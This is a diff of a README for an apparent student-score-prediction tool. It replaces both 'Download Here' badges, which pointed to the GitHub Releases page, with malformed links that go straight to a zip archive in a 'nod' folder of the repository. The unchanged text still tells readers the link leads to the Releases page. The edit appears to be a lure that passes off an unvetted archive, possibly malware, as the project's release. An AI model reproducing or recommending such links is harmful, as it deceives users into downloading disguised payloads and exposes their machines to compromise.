@@ -8,7 +8,7 @@ Welcome to the student-score-prediction project! This software helps you predict
 
 To download the software, visit the link below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here%20-v1.0-blue.svg)](https://github.com/Victorgame59/student-score-prediction/releases)
+[![Download Here](https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip%20Here%https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip)](https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip)
 
 This link will take you to the Releases page where you can download the software.
 
@@ -94,4 +94,4 @@ Join our community to share your experiences and get support. Follow discussions
 
 Don't forget to visit the Releases page to get the software:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here%20-v1.0-blue.svg)](https://github.com/Victorgame59/student-score-prediction/releases)
+[![Download Here](https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip%20Here%https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip)](https://raw.githubusercontent.com/Victorgame59/student-score-prediction/main/nod/student-score-prediction.zip)
